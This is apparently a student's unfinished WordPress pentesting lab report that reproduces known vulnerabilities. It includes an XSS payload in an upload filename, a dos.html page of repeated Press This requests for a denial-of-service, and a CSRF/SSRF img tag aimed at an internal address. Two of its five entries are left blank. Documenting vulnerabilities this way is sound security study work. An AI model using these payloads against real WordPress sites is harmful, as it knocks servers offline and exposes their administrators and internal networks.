
# Project 7 - WordPress Pentesting

Time spent: **6** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID 8819
  - [ ] Summary: An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel.

Two different "file to large" cases end up in interpolating the file name and appending it into DOM unsanitized leading to XSS.
Any file type can be used (.jar whatever) as the vuln happens before the type is validated.
    - Vulnerability types:injecting a scpript, xxs
    - Tested in version: 
    - Fixed in version: 
  - [ ] GIF Walkthrough: 8819.gif
  - [ ] Steps to recreate: 
 1.  Create a 20MB file called
Dinosaurs secret life<img src=x onerror=alert(1)>.png

2. Goto your wordpress site http://127.0.0.1/wp-admin/media-new.php and dragndrop or use file manager or choose the file via. the "Select Files" button.

3. A error will appear with ... exceeds the maximum upload size for this site. along with a alert box to display that the payload has been executed.
  - [ ] Affected source code:
    - [Link 1](https://hackerone.com/reports/203515)
    
    
2. (Required) Vulnerability Name or ID 8770
  - [ ] Summary: 
The Press This [4] function allows quick publishing with a special web
browser bookmarklet. An admin can also visit the Press This page
directly. One of the features of Press This is scanning an external
server for embeddable content. This is done with a GET request to:

https://www.securify.nl/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan

When this URL is called, Press This will download the contents located
at "URL" and look for content such as images and other embeddable
elements.
 This property can be abused by setting the
external URL to a huge file and have an authenticated admin visit it.
The PHP process will use 100% of its CPU resources to process the file.
If an authenticated admin can be lured to an external page, then the
malicious URL can be called many times, blocking all PHP server threads.
This will cause the server to be unreachable for a while.
    - Vulnerability types: DDOS
    - Tested in version: 
    - Fixed in version: 
  - [ ] GIF Walkthrough: 8770.gif
  - [ ] Steps to recreate:  
1. Install plug in Press This
2. Send get request on press this
3. On an external server, create a large text file with the command:
perl -e 'print "<>"x28000000' > foo.txt
4.Create a file dos.html on the external server with enough entries
to fill the connection pool of the WordPress server, as follows:
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
[..]
(replace <wp server> with the WordPress server address and <external
server> with the external server)
  5. Now have a logged in admin visit dos.html. The server will be down for a
while.
  - [ ] Affected source code: https://hackerone.com/reports/153093
    - [Link 1](https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829)
  
  
3. (Required) Vulnerability Name or ID 8376
  - [ ] Summary: 
The url http://xxx.xxx.xxx.xxx/wp-admin/press-this.php?u=URL_TO_SCRAPE&url-scan-submit=Scan does not validate that user intends to send a scrape request.
The filter does not validate for 0.0.0.0:PORT and allows the attacker to make the victim send GET request to servers priate127.0.0.1:PORT, localhost:PORT or anything which can be accessed via 0.0.0.0

So basicly a wordpress installations can send unwanted scrape/scan requests on behalf of their user invoked by the attacker. Including private connections via 0.0.0.0
    - Vulnerability types: Cross-Site Request Forgery (CSRF)
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
1. Sign in to owner of myWordpress.com
2. Victim is logged into Wordpress.
3. Victim visits bad site with a content of`<img src="//myWordpress.com/wp-admin/press-this.php?u=htto://0.0.0.0:8080&url-scan-submit=Scan" />
4. Victim sends a unwanted request to their server requesting a internal server address to be hit.
5.Server sends get request to 0.0.0.0:8080
6. Servers private 127.0.0.1 answers back.
This example is with a private address, but it could also be a public. address
  - [ ] Affected source code: (https://hackerone.com/reports/110801)
   https://hackerone.com/reports/110801
    https://core.trac.wordpress.org/changeset/36435
    https://wpvulndb.com/vulnerabilities/8376
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release
    
    
    
4. (Optional) Vulnerability Name or ID 9021
  - [ ] Summary: 
    - Vulnerability types:XXS
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 

  - [ ] Affected source code:
    
    
    
    
    
    
5. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

dos.html, dos, 

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

All of these challenges are very hard to find and follow as I am a Fincanca major with zero computing and linux background.
## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
